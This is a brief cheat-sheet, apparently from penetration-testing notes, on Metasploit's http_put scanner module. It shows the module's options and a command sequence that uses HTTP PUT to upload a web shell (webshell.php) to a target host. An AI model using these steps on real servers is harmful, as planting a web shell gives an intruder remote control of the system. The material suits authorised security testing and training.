# Metasploit

```
msf > use auxiliary/scanner/http/http_put 

msf auxiliary(scanner/http/http_put) > options 

Module options (auxiliary/scanner/http/http_put):

   Name      Current Setting        Required  Description
   ----      ---------------        --------  -----------
   ACTION    PUT                    yes       PUT or DELETE
   FILEDATA  msf test file          no        The data to upload into the file
   FILENAME  msf_http_put_test.txt  yes       The file to attempt to write or delete
   PATH      /                      yes       The path to attempt to write or delete
   Proxies                          no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                           yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT     80                     yes       The target port (TCP)
   SSL       false                  no        Negotiate SSL/TLS for outgoing connections
   THREADS   1                      yes       The number of concurrent threads (max one per host)
   VHOST                            no        HTTP server virtual host


Auxiliary action:

   Name  Description
   ----  -----------
   PUT   Upload local file



View the full module info with the info, or info -d command.

msf auxiliary(scanner/http/http_put) > set action <PUT | DELETE>

msf auxiliary(scanner/http/http_put) > set path /path/to/uri/directory/

msf auxiliary(scanner/http/http_put) > set threads 2

msf auxiliary(scanner/http/http_put) > set rhosts <IP>

msf auxiliary(scanner/http/http_put) > set rport <PORT>

msf auxiliary(scanner/http/http_put) > set filename webshell.php

msf auxiliary(scanner/http/http_put) > set filedata:/path/to/shell.php

msf auxiliary(scanner/http/http_put) > run
```